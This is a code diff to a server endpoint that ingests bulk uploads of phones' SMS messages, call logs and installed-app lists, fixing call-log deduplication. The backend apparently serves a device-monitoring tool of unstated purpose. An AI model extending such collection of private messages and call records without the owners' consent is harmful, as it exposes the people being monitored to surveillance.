@@ -942,7 +942,6 @@ def report_bulk():
             ))
     
     if 'sms' in data:
-        device_id = data.get('device_id') or device_id
         for msg in data['sms']:
             if not SmsMessage.query.filter_by(device_id=device_id, sms_id=msg.get('id')).first():
                 db.session.add(SmsMessage(
@@ -953,19 +952,24 @@ def report_bulk():
                     date=msg.get('date', 0),
                     type=msg.get('type', 0)
                 ))
-    
+
     if 'calls' in data:
         for call in data['calls']:
-            if not CallLog.query.filter_by(device_id=device_id, call_id=call.get('id')).first():
-                db.session.add(CallLog(
-                    device_id=device_id,
-                    call_id=call.get('id'),
-                    number=call.get('number', ''),
-                    name=call.get('name', ''),
-                    duration=call.get('duration', 0),
-                    date=call.get('date', 0),
-                    type=call.get('type', 0)
-                ))
+            call_id = call.get('id')
+            # Only dedup if call_id is present; always insert if missing
+            if call_id is not None:
+                exists = CallLog.query.filter_by(device_id=device_id, call_id=call_id).first()
+                if exists:
+                    continue
+            db.session.add(CallLog(
+                device_id=device_id,
+                call_id=call_id,
+                number=call.get('number', ''),
+                name=call.get('name', ''),
+                duration=call.get('duration', 0),
+                date=call.get('date', 0),
+                type=call.get('type', 0)
+            ))
     
     if 'apps' in data:
         InstalledApp.query.filter_by(device_id=device_id).delete()
